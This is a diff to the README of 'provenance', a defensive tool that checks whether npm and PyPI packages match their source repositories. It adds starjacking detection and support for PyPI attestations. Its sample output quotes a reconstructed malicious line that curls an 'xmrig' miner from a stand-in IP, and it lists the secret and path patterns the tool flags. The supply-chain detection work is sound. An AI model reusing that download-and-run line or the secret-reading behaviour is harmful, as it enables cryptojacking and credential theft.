@@ -1,6 +1,6 @@
 # provenance
 
-**Is the package on npm or PyPI the code in its repository?** provenance downloads a release and the exact commit it was built from, then compares them file by file. It reports the install scripts, dependencies and code that only appeared at publish time. It needs nothing but Python's standard library.
+**Is the package on npm or PyPI the code in its repository?** provenance downloads a release and the exact commit it was built from, then compares them file by file. It reports the install scripts, dependencies and code that only appeared at publish time, and a package whose signed build ran in a different repository than the one it advertises (starjacking). It needs nothing but Python's standard library.
 
 [![ci](https://github.com/njuj/provenance/actions/workflows/ci.yml/badge.svg)](https://github.com/njuj/provenance/actions/workflows/ci.yml)
 ![python](https://img.shields.io/badge/python-3.10%2B-ffd166?labelColor=0b0f17)
@@ -17,6 +17,7 @@ Reviewers read the repository, but users install the tarball, and the most damag
 - **ua-parser-js (2021):** a hijacked account published releases with a `preinstall` script that fetched a cryptominer.
 - **xz-utils (2024):** the backdoor's trigger was only in the release tarballs, not in the repository.
 - **ultralytics (2024):** a poisoned release workflow put a miner into the PyPI files of a repository that was clean.
+- **starjacking:** a package links to a famous repository to borrow its stars and reputation. The registry never checks that link; a signed build attestation can.
 
 ```text
 $ python examples/replay.py          # the npm / PyPI attacks above, rebuilt with inert payloads
@@ -36,15 +37,21 @@ $ python examples/replay.py          # the npm / PyPI attacks above, rebuilt wit
    ✖ DIFFERS  the package contains code its repository does not explain
    ✖ CRITICAL ultralytics/utils/downloads.py: runs commands or decoded code
                 + subprocess.Popen(['curl', '-sL', 'http://203.0.113.50/xmrig', '-o', '/tmp/ultralytics_runner'])
+
+ pypi:fastjsonx@2.1.0  fastjsonx-2.1.0.tar.gz  ·  2 files
+   source  github.com/throwaway-4412/fastjson @ 9d1e0c4b7a2f  (signed PyPI attestation (Trusted Publishing))
+   ✖ DIFFERS  its signed build ran in a different repository than the one it names
+   ✖ HIGH     Built from a different repository than the one it names
+              └ the package points to github.com/famous-org/fastjson, but its signed build ran in github.com/throwaway-4412/fastjson
 ```
 
-The real malicious versions were removed from the registries long ago, so these are reconstructions with harmless stand-in payloads, served by a local fake npm, PyPI and GitHub. On live packages it looks like this (output condensed):
+The real malicious versions were removed from the registries long ago, so these are reconstructions with harmless stand-in payloads, served by a local fake npm, PyPI and GitHub. The starjacking package and both repositories are fictional. On live packages it looks like this (output condensed):
 
 ```text
 $ provenance left-pad pypi:requests vite
 
  npm:left-pad@1.3.0      ✔ MATCHES     10 identical
- pypi:requests@2.34.2    ✔ MATCHES     78 identical · 7 metadata
+ pypi:requests@2.34.2    ✔ MATCHES     78 identical · 7 metadata          (commit from its signed PyPI attestation)
  npm:vite@8.3.5          ✔ CONSISTENT  20 identical · 16 built   (commit from vite's signed SLSA build provenance)
 ```
 
@@ -62,7 +69,7 @@ Set `GITHUB_TOKEN` if you check many packages, since tag lookups use GitHub's AP
 
 ## How it works
 
-1. **Which commit.** A release is matched to the exact commit it came from, using in order: npm's **signed SLSA build provenance**, which names the commit the publishing workflow ran on; the `gitHead` npm records at publish time; and finally the release's tag (`v1.2.3`, `1.2.3`, `name@1.2.3`, `rel_1_2_3`… then the repository's own tag list). In a monorepo, the package is found by the `name` in its `package.json`.
+1. **Which commit.** A release is matched to the exact commit it came from, using in order: its **signed build attestation**, which names the repository, commit and workflow of the build (npm's SLSA provenance, or PyPI's Trusted Publishing attestation from PEP 740, read from the Sigstore certificate); the `gitHead` npm records at publish time; and finally the release's tag (`v1.2.3`, `1.2.3`, `name@1.2.3`, `rel_1_2_3`… then the repository's own tag list). In a monorepo, the package is found by the `name` in its `package.json`.
 2. **Five piles.** Every published file is sorted into one of these:
 
    | pile | meaning |
@@ -76,6 +83,8 @@ Set `GITHUB_TOKEN` if you check many packages, since tag lookups use GitHub's AP
 3. **What the code can do.** Minifiers rename variables but keep what code *does*. provenance extracts each file's capabilities: running commands, `eval` / `new Function` / `_compile`, decoding base64, hex or zlib, obfuscation, environment secrets (`NPM_TOKEN`, `AWS_*`…), sensitive paths (`~/.ssh`, `.npmrc`, browser and wallet stores), web requests, and the hosts it names. It then reports the capabilities that **nothing in the repository has**. Running commands plus a new host is critical. A new host alone in built code is low, because it usually comes from a bundled dependency.
 4. **Source maps, without rebuilding.** If a built file ships a source map, the sources embedded in it must be the repository's sources. Code that maps to **no** source line is code the build did not get from the repository, and that is where an injected payload sits.
 5. **The manifest.** Install scripts (`preinstall`, `install`, `postinstall`) and dependencies that appear only in the published `package.json` are reported. Per-platform binary packages pinned to the release's own version, or ones the repository's release tooling names, are recognised.
+
+6. **Which repository.** A package can name any repository it likes, and registries do not check. When a signed attestation says the build ran somewhere else, that is reported as **high** and the files are compared with the repository that really built them. A renamed or transferred repository is not a mismatch: both names are resolved through GitHub first.
 
 Formatting is never mistaken for an attack. A file whose added lines only reuse names and strings the repository already has is quiet: comments stripped, a version stamped in, TypeScript types removed, helpers renamed to `_foo2`.
 
@@ -91,31 +100,34 @@ I checked the latest release of **98 of the most-used packages**: 68 from npm (r
 
 The run had no critical or high findings and one medium: `prop-types` ships a UMD bundle, `prop-types.js`, that is not in its repository and names `bugs.chromium.org`, which comes from bundled React code. Across those releases, 12,725 files were identical to the repository, 2,797 traced through source maps and 8,379 were built output. The first version flagged 17 of them. Each one led to a rule above: monorepo manifests, `_version.py` files written by setuptools-scm, comments stripped at publish, types stripped in source maps, per-platform binaries, and bundles of whole libraries.
 
+**Signed builds on PyPI.** Of 20 popular PyPI projects checked again with attestation support (requests, urllib3, flask, pydantic, pytest, black, click, jinja2, pip, sigstore, twine…), **17** were matched to their commit through the signed Trusted Publishing attestation instead of a tag guess. The other 3 fell back to tags. All 20 came out matching or consistent, with no finding at medium or above.
+
 ## Testing
 
 ```bash
 python -m unittest discover -s tests -v
 ```
 
-There are 27 tests. They cover the three incidents above, code injected into a build where the source map does not explain it, a build made from a tampered source, a dependency slipped in at publish time, an obfuscated extra file, a modified file that reads `AWS_SECRET_ACCESS_KEY` and calls home, and the quiet cases: a clean package, comments stripped and a version stamped in, a monorepo, wheel versus `src/` layout, tag fallback, and a signed commit preferred over `gitHead`. Everything runs offline against [`tests/fakeworld.py`](tests/fakeworld.py), a local npm, PyPI and GitHub. CI also checks real releases end to end.
+There are 32 tests. They cover the three incidents above, starjacking on npm and on PyPI (and a renamed repository, which is not starjacking), commits read from PEP 740 attestations, 2,000 mutated certificates that must never crash the reader, code injected into a build where the source map does not explain it, a build made from a tampered source, a dependency slipped in at publish time, an obfuscated extra file, a modified file that reads `AWS_SECRET_ACCESS_KEY` and calls home, and the quiet cases: a clean package, comments stripped and a version stamped in, a monorepo, wheel versus `src/` layout, tag fallback, and a signed commit preferred over `gitHead`. Everything runs offline against [`tests/fakeworld.py`](tests/fakeworld.py), a local npm, PyPI and GitHub. CI also checks real releases end to end.
 
 ## Limits
 
 - **It compares; it does not rebuild.** Built files without source maps are judged by what they can do, not byte for byte. That catches payloads that run commands, phone home or decode and evaluate data. A subtle logic change inside a minified bundle can still slip through.
 - **If the malicious code is committed to the repository, the package matches its source.** provenance catches divergence at publish time. Reviewing the repository is still your job.
 - **GitHub only.** It does not cover GitLab, Bitbucket or private registries.
-- **Signatures are not verified.** It reads the commit from npm's provenance attestation but does not check the Sigstore signature. Use `npm audit signatures` for that.
+- **Signatures are not verified.** It reads the repository and commit from npm's and PyPI's attestations, which the registries verify at upload, but it does not check the Sigstore signatures itself. Use `npm audit signatures` or `pypi-attestations verify` for that.
 
 ## Layout
 
 ```
-provenance/registry.py      npm and PyPI: files, repository, commit (SLSA attestation, gitHead, tags)
+provenance/registry.py      npm and PyPI: files, repository, commit (signed attestation, gitHead, tags), starjacking
+provenance/attest.py        Sigstore certificates: the build's repository, commit, ref and workflow (PEP 740)
 provenance/source.py        the repository snapshot at that commit
 provenance/compare.py       the five piles, the manifest, and the findings
 provenance/capabilities.py  what a file can do (runs, decodes, evaluates, reads secrets, contacts)
 provenance/sourcemap.py     VLQ decoding, embedded sources, unmapped code
 provenance/net.py           HTTP and in-memory archives
-examples/replay.py          the three incidents, replayed locally
+examples/replay.py          the three incidents and starjacking, replayed locally
 tests/                      unit and scenario tests against a fake npm / PyPI / GitHub
 ```
 
